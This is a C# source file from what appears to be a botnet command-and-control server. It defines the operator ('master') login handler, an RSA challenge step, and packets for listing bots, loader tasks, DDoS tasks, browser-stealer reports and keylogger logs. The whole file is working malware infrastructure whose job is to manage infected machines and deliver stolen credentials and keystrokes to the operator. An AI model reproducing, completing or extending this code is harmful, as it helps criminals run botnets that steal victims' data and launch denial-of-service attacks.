using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using Server.Core.Config;
using System.Data.SQLite;
using System.Threading;
using Server.Core.Network;
using Server.Security;
using Server.Utilities;

namespace Server.Core.Handlers
{
    enum STATISTICS_TYPE : int
    {
        INFORMATION = 0,
        OS = 1,
        COUNTRY = 2
    }

    #region MASTER_PACKET
    enum MASTER_PACKET : byte
    {
        LOGIN = 0x1,
        LOGIN_KEY = 0x2,
        BOTLIST = 0x3,
        TASKLIST = 0x4,
        ADD_TASK = 0x5,
        REMOVE_TASK = 0x6,
        STATISTICS = 0x7,
        DDOSLIST = 0x8,
        DDOS = 0x9,
        STEALERLIST = 0x10,
        KEYLOGLIST = 0x11,
        KEYLOG = 0x12,
        KEYLOG_REMOVE = 0x13,
        BROWSER_STEALER_TAG = 0x14,
        KEYLOG_TAG = 0x15
    }
    #endregion

    #region MASTER_CLASS
    class CMaster
    {
    	#region VARIABLES
        public Int32 Master_ID { get; set; }
        public CClient MasterClient { get; set; }
        
        #region AUTHORIZATION
        //Authorization
        public String Username { get; set; }

        public String Password { get; set; }

        public Boolean IsAuthorized { get; set; }

        public String AuthString { get; set; }

        public String Public_Key { get; set; }

        #endregion

        #region BOT_LIST
        //Botlist
        public Int32 TotalBots { get; set; }
        public Int32 OnlineBots { get; set; }
        public int CurrentBotPage = 1;
        public string CurrentBotlist = "";
        #endregion

        #region TASK_LIST
        //Tasklist
        public int TotalLoaderTasks { get; set; }

        public string CurrentTasklist = "";
        #endregion
        
        #region DDOS_LIST
        public int TotalDdosTasks { get; set; }

        public string CurrentDdosList = "";
        #endregion
        
        #region REPORTS
        public int TotalStealerReports { get; set; }
        public int TotalKeylogReports { get; set; }

        public int CurrentStealerPage = 1;
        public string CurrentStealerList = "";
        public string StealerTags = "";
        public string KeyloggerTags = "";

        public int CurrentKeyloggerPage = 1;
        public string CurrentKeyloggerList = "";
        #endregion

        public int Avg_CPU_Usage { get; set; }
        public int ResultsPerPage { get; set; }
        public string OSStatistics = "";
        public string CountryStatistics = "";
        #endregion

        #region CONSTRUCTOR
        public CMaster()
        {
           
        }
        #endregion

        #region Send_Packet
        bool SendPacket(byte bPacket, string strArguments)
        {
            try
            {
                return MasterClient.SendPacket(MasterClient.CreatePacket(bPacket, strArguments));
            }
            catch { }
            return false;
        }
        #endregion

        #region SEND_AUTH
        public bool SendAuth()
        {
            return this.SendPacket((byte)MASTER_PACKET.LOGIN, CConfig.BotnetName);
        }
        #endregion

        #region SEND_BOT_LIST
        public bool SendBotlist(String strBotlist, Int32 iPage)
        {
            if (String.IsNullOrEmpty(strBotlist)) return false;

            try
            {
                CPacket BotlistPacket = MasterClient.CreatePacket((Byte)MASTER_PACKET.BOTLIST, String.Format("{0}|{1}", strBotlist, iPage));

                return MasterClient.SendPacket(BotlistPacket);
            }
            catch { }
            return false;
        }
        #endregion

        #region SEND_TASK_LIST
        public Boolean SendTasklist(String strTasklist)
        {
            if (String.IsNullOrEmpty(strTasklist)) return false;

            try
            {
                CPacket TasklistPacket = MasterClient.CreatePacket((Byte)MASTER_PACKET.TASKLIST, strTasklist);

                return MasterClient.SendPacket(TasklistPacket);
            }
            catch
            {
            	
            }

            return false;
        }
        #endregion
        
        #region SEND_DDOS_LIST
        public bool SendDdosList(string strDdoslist)
        {
        	try
        	{
        		CPacket DdosListPacket = this.MasterClient.CreatePacket((byte)MASTER_PACKET.DDOSLIST, strDdoslist);
        		
        		return this.MasterClient.SendPacket(DdosListPacket);
        	}
        	catch {}
        	return false;
        }
        #endregion

        #region SEND_STEALER_LIST
        public bool SendStealerList(string strStealerList, int iPage)
        {
            try
            {
                CPacket StealerListPacket = this.MasterClient.CreatePacket(
                    (byte)MASTER_PACKET.STEALERLIST, string.Format(
                    "{0}|{1}",
                    strStealerList, iPage)
                    );

                return MasterClient.SendPacket(StealerListPacket);
            }
            catch { }

            return false;
        }
        #endregion

        #region SEND_KEYLOG_LIST
        public bool SendKeylogList(string strKeyloggerList, int iPage)
        {
            try
            {
                CPacket KeylogListPacket = this.MasterClient.CreatePacket(
                    (byte)MASTER_PACKET.KEYLOGLIST, string.Format(
                    "{0}|{1}",
                    strKeyloggerList, iPage)
                    );

                return MasterClient.SendPacket(KeylogListPacket);
            }
            catch { }

            return false;
        }
        #endregion

        #region SEND_KEYLOG_REPORT
        public bool SendKeylogReport(int iID)
        {
            try
            {
                CPacket KeylogReportPacket = this.MasterClient.CreatePacket(
                    (byte)MASTER_PACKET.KEYLOG, CKeylogManager.GetReport(iID)
                    );

                return MasterClient.SendPacket(KeylogReportPacket);
            }
            catch { }

            return false;
        }
        #endregion

        #region SEND_KEYLOG_REPORT_REMOVED
        public bool SendKeylogReportRemoved(int iID)
        {
            return this.SendPacket((byte)MASTER_PACKET.KEYLOG_REMOVE, iID.ToString());
        }
        #endregion

        #region SEND_REMOVED_TASK
        public Boolean SendTaskRemoved(Int32 iTaskID)
        {
            try
            {
                CPacket TaskRemovedPacket = MasterClient.CreatePacket((Byte)MASTER_PACKET.REMOVE_TASK, iTaskID.ToString());

                return MasterClient.SendPacket(TaskRemovedPacket);
            }
            catch { }
            return false;
        }
        #endregion

        #region SEND_STATISTICS
        public bool SendStatistics(STATISTICS_TYPE StatisticsType, string strArguments)
        {
            return this.SendPacket((byte)MASTER_PACKET.STATISTICS, string.Format("{0}|{1}", (int)StatisticsType, strArguments));
        }
        #endregion

        #region ASK_FOR_KEY
        public bool AskForKey()
        {
            try
            {
                CPacket KeyPacket = MasterClient.CreatePacket((Byte)MASTER_PACKET.LOGIN_KEY, "1");

                return MasterClient.SendPacket(KeyPacket);
            }
            catch
            {
            	
            }
            return false;
        }
        #endregion

        #region SEND_RSA_AUTH
        public bool SendRSAAuth()
        {
            try
            {
                if (String.IsNullOrEmpty(this.Public_Key))
                {
#if DEBUG
                    Console.WriteLine(CConstants.InvalidPublicKey);
#endif
                    return false;
                }
  
                String strAuthString = CUtilities.RandomString(CUtilities.RandomInt(8,16));

                byte[] arr_bRandomString = UnicodeEncoding.Unicode.GetBytes(strAuthString);

                if (arr_bRandomString == null) return false;

                arr_bRandomString = CRSA.Encrypt(arr_bRandomString, this.Public_Key, 2048);

                if(arr_bRandomString == null)
                {
#if DEBUG
                    Console.WriteLine(CConstants.SendRSAAuth_RSAEncrypt_FAILED);
#endif
                    return false;
                }

                CPacket KeyPacket = MasterClient.CreatePacket((Byte)MASTER_PACKET.LOGIN_KEY, Convert.ToBase64String(arr_bRandomString));

                if(MasterClient.SendPacket(KeyPacket))
                {
                    this.AuthString = strAuthString;
                    return true;
                }
            }
            catch
            {
            
            }
            return false;
        }
        #endregion
    }

    #region MASTER_HANDLER
    class CMasterHandler
    {
        private List<CMaster> lstMaster = null;

        public CMasterHandler()
        {
            lstMaster = new List<CMaster>();
        }

        #region ADD_MASTER
        public Boolean AddMaster(CClient Client, String[] arr_strArguments)
        {
            if (Client == null) return false;

            if (arr_strArguments.Length != CConstants.MASTER_LOGIN_ARGUMENT_LENGTH) return false;

            try
            {
                Int32 iMasterID = -1;
                String strPublicKey = String.Empty;
                Int32 iAuthorized = AuthorizeMaster(arr_strArguments[0], arr_strArguments[1], out iMasterID, out strPublicKey);

                Console.WriteLine("iMasterID: {0}", iMasterID);

                if (iAuthorized >= 1)
                {
                    CMaster Master = new CMaster();
                    Master.Master_ID = iMasterID;
                    Master.MasterClient = Client;
                    Master.Username = arr_strArguments[0];
                    Master.Password = arr_strArguments[1];
                    Master.IsAuthorized = false;
                    Master.Public_Key = strPublicKey;

                    lock (lstMaster)
                    {
                        lstMaster.Add(Master);
                    }

                    if (iAuthorized == 2)
                    {
                        if (Master.AskForKey())
                        {
                            Console.WriteLine("[EVENT] Detected first login from Master. Requested Master: {0} Public key.", Master.Username);
                        }
                    }
                    else
                    {
                        if (Master.SendRSAAuth()) return true;
#if DEBUG
                        else
                        {
                            Console.WriteLine(CConstants.SendRSAAuth_FAILED);
                            return false;
                        }
#endif
                    }
                    return true;
                }
                else if(iAuthorized == 0)
                    Console.WriteLine("[ERROR] AuthorizeMaster failed. Incorrect Username or Password.");

            }
            catch { }

            return false;
        }
        #endregion

        #region REMOVE_MASTER
        public Boolean RemoveMaster(CClient Client)
        {
            lock (lstMaster)
            {
                foreach (CMaster Master in lstMaster.ToArray())
                {
                    if (Master.MasterClient == Client)
                        return lstMaster.Remove(Master);
                }
                return false;
            }
        }
        #endregion

        #region IS_MASTER
        public Boolean IsMaster(CClient Client)
        {
            lock(lstMaster)
            {
                foreach(CMaster Master in lstMaster.ToArray())
                {
                    if (Master.MasterClient == Client)
                        return true;
                }
                return false;
            }
        }
        #endregion

        #region AUTHORIZE_MASTER
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        Int32 AuthorizeMaster(String strUsername, String strPassword, out Int32 iMasterID, out String strPublicKey)
        {
            iMasterID = -1;
            strPublicKey = String.Empty;
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery("SELECT * FROM masters");

                if(!Result.HasRows)
                {
                    Console.WriteLine("[ERROR] AuthorizeMaster failed. There are no Masters in database. Use .addmaster");
                    return -1;
                }

                while(Result.Read())
                {
                    if (Result["master_username"].ToString() == strUsername && Result["master_password"].ToString() == strPassword)
                    {
                        if(!Int32.TryParse(Result["master_id"].ToString(),out iMasterID)) return -1;

                        strPublicKey = Result["master_key"].ToString();

                        if(String.IsNullOrEmpty(strPublicKey))
                        {
                            return 2;
                        }
                        return 1;
                    }
                }
            }
            catch { }
            return 0;
        }
        #endregion

        #region GET_MASTER_BY_SOCKET
        public CMaster GetMasterBySocket(CClient Client)
        {
            lock (lstMaster)
            {
                try
                {
                    foreach (CMaster Master in lstMaster.ToArray())
                    {
                        if (Master.MasterClient == Client) return Master;
                    }
                }
                catch { }
                return null;
            }
        }
        #endregion

        #region GET_MASTERS
        public CMaster[] GetMasters()
        {
            lock(lstMaster)
            {
                return lstMaster.ToArray();
            }
        }
        #endregion

        #region MASTER_COUNT
        public Int32 GetTotal()
        {
            lock(lstMaster)
            {
                return lstMaster.Count;
            }
        }
        #endregion

        #region GET_BY_INDEX
        public CMaster GetByIndex(Int32 iIndex)
        {
            lock(lstMaster)
            {
                return lstMaster[iIndex];
            }
        }

        #endregion

        #region REPLACE_BY_INDEX
        public void ReplaceByIndex(Int32 iIndex, CMaster New_Master)
        {
            lock(lstMaster)
            {
                lstMaster[iIndex] = New_Master;
            }
        }
        #endregion

        #region REPLACE_BY_SOCKET
        public void ReplaceBySocket(CClient Client, CMaster Master)
        {
            lock(lstMaster)
            {
                for(int i = 0; i < lstMaster.Count; i++)
                {
                    if (lstMaster[i].MasterClient == Client)
                        lstMaster[i] = Master;
                }
            }
        }
        #endregion
#endregion
    }
    #endregion
}
